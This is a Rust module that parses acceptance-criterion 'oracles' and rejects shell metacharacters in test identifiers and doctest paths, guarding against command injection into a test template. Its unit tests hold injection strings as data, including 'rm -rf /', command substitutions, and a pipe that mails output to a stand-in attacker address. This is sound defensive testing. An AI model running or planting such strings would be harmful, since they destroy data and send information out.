//! Oracles — the machine-checkable half of an acceptance criterion (PLAN.md P3).
//!
//! > Every acceptance criterion must name a machine-checkable oracle, or the
//! > spec does not pass its gate.
//!
//! `Human` is a legal oracle kind on purpose. The point is not to pretend every
//! criterion can be automated; it is to make the ones that cannot be automated
//! *visible*, so human review time shows up as a number on the gate report
//! instead of as a surprise on a Friday afternoon.

use anyhow::{Result, bail};
use serde::Serialize;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum Oracle {
    /// `oracle: cmd `cargo test x` exit 0`
    Cmd { cmd: String, exit: i32 },
    /// `oracle: test tests/api.rs::rejects_over_limit`
    Test { id: String },
    /// `oracle: schema schemas/gate.json validates .keel/runs/*/gates/G0.json`
    Schema { schema: String, target: String },
    /// `oracle: doctest src/lib.rs`
    Doctest { path: String },
    /// `oracle: human a reviewer confirms the error message names the file`
    Human { judgement: String },
}

impl Oracle {
    pub fn kind(&self) -> &'static str {
        match self {
            Oracle::Cmd { .. } => "cmd",
            Oracle::Test { .. } => "test",
            Oracle::Schema { .. } => "schema",
            Oracle::Doctest { .. } => "doctest",
            Oracle::Human { .. } => "human",
        }
    }

    /// The checkable text of this oracle, already unquoted. This is what the
    /// placeholder scan looks at — by the time it gets here there are no
    /// backticks left for scaffold text to hide behind.
    pub fn payload(&self) -> &str {
        match self {
            Oracle::Cmd { cmd, .. } => cmd,
            Oracle::Test { id } => id,
            Oracle::Schema { target, .. } => target,
            Oracle::Doctest { path } => path,
            Oracle::Human { judgement } => judgement,
        }
    }

    /// Whether satisfying this oracle costs a person's attention.
    pub fn is_human(&self) -> bool {
        matches!(self, Oracle::Human { .. })
    }

    /// A one-line rendering, for gate evidence and for the map of human cost.
    pub fn summary(&self) -> String {
        match self {
            Oracle::Cmd { cmd, exit } => format!("`{cmd}` exits {exit}"),
            Oracle::Test { id } => format!("test {id}"),
            Oracle::Schema { schema, target } => format!("{target} validates against {schema}"),
            Oracle::Doctest { path } => format!("doctests in {path}"),
            Oracle::Human { judgement } => format!("human: {judgement}"),
        }
    }
}

/// Characters that let a value break out of shell quoting or trigger
/// substitution, whatever style of quoting the `[oracle]` template used.
///
/// `test` and `doctest` oracles substitute their identifier unescaped into a
/// command template (`oracle_exec::expand_test_template`) — the template is
/// human-authored and trusted, but the identifier comes from the criterion,
/// which can be agent-authored and is reviewed for EARS semantics and oracle
/// *coverage*, not for shell-safety of a test name buried inside it. Without
/// this, a criterion naming a test id that embeds a backtick-quoted shell
/// command parses cleanly, passes G0, and runs the injected command the
/// first time G2 executes that oracle.
///
/// Deliberately a denylist, not a character allowlist: real test identifiers
/// use brackets (pytest parametrization), spaces (Jest descriptions) and
/// asterisks, none of which alone achieve execution. What actually achieves
/// it — command substitution, chaining, quote-breaking, escaping — is this
/// fixed, small set, blocked regardless of whether the template quotes the
/// placeholder.
const SHELL_METACHARACTERS: &[char] =
    &['`', '$', ';', '|', '&', '\'', '"', '\\', '\n', '\r', '\0'];

fn reject_shell_metacharacters(field: &str, value: &str) -> Result<()> {
    if let Some(c) = value.chars().find(|c| SHELL_METACHARACTERS.contains(c)) {
        bail!(
            "{field} `{value}` contains `{c}`, which a shell would treat specially — \
             this oracle's identifier is substituted into a command template unescaped, \
             so this could run as code rather than name a test. Remove it."
        );
    }
    Ok(())
}

/// Parse the text after `oracle:`.
pub fn parse(raw: &str) -> Result<Oracle> {
    let s = raw.trim();
    if s.is_empty() {
        bail!("empty oracle");
    }
    let (kind, rest) = s.split_once(char::is_whitespace).unwrap_or((s, ""));
    let rest = rest.trim();

    match kind.to_ascii_lowercase().as_str() {
        "cmd" => {
            let (cmd, exit) = split_exit(rest)?;
            if cmd.is_empty() {
                bail!("`cmd` oracle has no command");
            }
            Ok(Oracle::Cmd { cmd, exit })
        }
        "test" => {
            if rest.is_empty() {
                bail!("`test` oracle has no test identifier");
            }
            reject_shell_metacharacters("test identifier", rest)?;
            Ok(Oracle::Test { id: rest.to_string() })
        }
        "schema" => {
            let Some((schema, target)) = rest.split_once(" validates ") else {
                bail!("`schema` oracle must read `schema <schema> validates <target>`");
            };
            let (schema, target) = (schema.trim(), target.trim());
            if schema.is_empty() || target.is_empty() {
                bail!("`schema` oracle is missing a schema or a target");
            }
            Ok(Oracle::Schema { schema: unquote(schema), target: unquote(target) })
        }
        "doctest" => {
            if rest.is_empty() {
                bail!("`doctest` oracle has no path");
            }
            let path = unquote(rest);
            reject_shell_metacharacters("doctest path", &path)?;
            Ok(Oracle::Doctest { path })
        }
        "human" => {
            if rest.is_empty() {
                bail!("`human` oracle must say what the reviewer is judging");
            }
            Ok(Oracle::Human { judgement: rest.to_string() })
        }
        other => bail!(
            "unknown oracle kind `{other}` (expected one of: cmd, test, schema, doctest, human)"
        ),
    }
}

/// Split a `cmd` oracle into its command and expected exit code. The command
/// may be backticked, which is how anyone sane writes a shell command inside
/// markdown.
fn split_exit(rest: &str) -> Result<(String, i32)> {
    // Prefer the trailing ` exit N`, but only outside backticks so that a
    // command containing the word "exit" is not truncated.
    let outside = last_index_outside_backticks(rest, " exit ");
    let Some(at) = outside else {
        bail!("`cmd` oracle must end with ` exit <code>` so the expectation is explicit");
    };
    let cmd = unquote(rest[..at].trim());
    let code = rest[at + " exit ".len()..].trim();
    let exit: i32 = code
        .parse()
        .map_err(|_| anyhow::anyhow!("`{code}` is not an exit code"))?;
    Ok((cmd, exit))
}

fn last_index_outside_backticks(s: &str, needle: &str) -> Option<usize> {
    let bytes: Vec<char> = s.chars().collect();
    let mut in_code = false;
    let mut byte_at = 0usize;
    let mut found = None;
    for (i, c) in bytes.iter().enumerate() {
        if *c == '`' {
            in_code = !in_code;
        }
        if !in_code && s[byte_at..].starts_with(needle) {
            found = Some(byte_at);
        }
        byte_at += c.len_utf8();
        let _ = i;
    }
    found
}

fn unquote(s: &str) -> String {
    let t = s.trim();
    if t.len() >= 2 && ((t.starts_with('`') && t.ends_with('`')) || (t.starts_with('"') && t.ends_with('"'))) {
        t[1..t.len() - 1].to_string()
    } else {
        t.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_test_identifier_with_a_command_substitution_payload_is_rejected() {
        let err = parse("test tests/x.rs::y`touch pwned`").unwrap_err().to_string();
        assert!(err.contains('`'), "{err}");
    }

    #[test]
    fn a_test_identifier_with_dollar_paren_is_rejected() {
        let err = parse("test tests/x.rs::y$(touch pwned)").unwrap_err().to_string();
        assert!(err.contains('$'), "{err}");
    }

    #[test]
    fn a_test_identifier_with_a_semicolon_is_rejected() {
        assert!(parse("test tests/x.rs::y; rm -rf /").is_err());
    }

    #[test]
    fn a_test_identifier_with_a_pipe_is_rejected() {
        assert!(parse("test tests/x.rs::y | mail me@evil.example").is_err());
    }

    #[test]
    fn a_test_identifier_with_a_quote_is_rejected() {
        assert!(parse("test tests/x.rs::y'; rm -rf /'").is_err());
        assert!(parse(r#"test tests/x.rs::y"; rm -rf /""#).is_err());
    }

    #[test]
    fn ordinary_test_identifiers_across_ecosystems_still_parse() {
        // Rust
        assert!(parse("test tests/trajectory.rs::one_json_object_per_line").is_ok());
        // pytest, parametrized
        assert!(parse("test tests/test_x.py::test_bar[param-1]").is_ok());
        // Go
        assert!(parse("test ./pkg/thing::TestServe").is_ok());
        // Jest / mocha, a spaced description
        assert!(parse("test src/x.test.js::renders the button when enabled").is_ok());
        // Java/JUnit style dotted method
        assert!(parse("test src/FooTest.java::FooTest.shouldServe").is_ok());
    }

    #[test]
    fn a_doctest_path_with_an_injection_payload_is_rejected() {
        assert!(parse("doctest src/lib.rs`touch pwned`").is_err());
        assert!(parse("doctest `src/lib.rs; rm -rf /`").is_err());
    }

    #[test]
    fn an_ordinary_doctest_path_still_parses() {
        assert_eq!(parse("doctest src/lib.rs").unwrap(), Oracle::Doctest { path: "src/lib.rs".into() });
    }

    #[test]
    fn parses_a_command_oracle() {
        let o = parse("cmd `cargo test --test rate_limit` exit 0").unwrap();
        assert_eq!(o, Oracle::Cmd { cmd: "cargo test --test rate_limit".into(), exit: 0 });
        assert_eq!(o.kind(), "cmd");
        assert!(!o.is_human());
    }

    #[test]
    fn a_command_oracle_must_state_its_expected_exit_code() {
        let err = parse("cmd `cargo test`").unwrap_err().to_string();
        assert!(err.contains("exit"), "{err}");
    }

    #[test]
    fn a_command_containing_the_word_exit_is_not_truncated() {
        let o = parse("cmd `sh -c 'exit 3'` exit 3").unwrap();
        assert_eq!(o, Oracle::Cmd { cmd: "sh -c 'exit 3'".into(), exit: 3 });
    }

    #[test]
    fn non_zero_expectations_are_legal() {
        assert_eq!(
            parse("cmd `keel store check` exit 1").unwrap(),
            Oracle::Cmd { cmd: "keel store check".into(), exit: 1 }
        );
    }

    #[test]
    fn parses_the_other_kinds() {
        assert_eq!(
            parse("test tests/cli.rs::drift_is_caught").unwrap(),
            Oracle::Test { id: "tests/cli.rs::drift_is_caught".into() }
        );
        assert_eq!(
            parse("schema `schemas/gate.json` validates `.keel/gates/G0.json`").unwrap(),
            Oracle::Schema { schema: "schemas/gate.json".into(), target: ".keel/gates/G0.json".into() }
        );
        assert_eq!(
            parse("doctest src/lib.rs").unwrap(),
            Oracle::Doctest { path: "src/lib.rs".into() }
        );
    }

    #[test]
    fn human_judgement_is_legal_but_must_say_what_is_judged() {
        let o = parse("human reviewer confirms the message names the offending file").unwrap();
        assert!(o.is_human());
        assert!(o.summary().starts_with("human:"));
        assert!(parse("human").is_err(), "a bare `human` oracle must be rejected");
    }

    #[test]
    fn unknown_kinds_are_rejected_with_the_legal_set() {
        let err = parse("vibes it feels right").unwrap_err().to_string();
        assert!(err.contains("cmd, test, schema, doctest, human"), "{err}");
    }

    #[test]
    fn payload_is_the_unquoted_checkable_text() {
        assert_eq!(parse("cmd `cargo test` exit 0").unwrap().payload(), "cargo test");
        assert_eq!(parse("test a::b").unwrap().payload(), "a::b");
        assert_eq!(parse("human confirms X").unwrap().payload(), "confirms X");
    }

    #[test]
    fn empty_oracle_is_rejected() {
        assert!(parse("   ").is_err());
    }
}
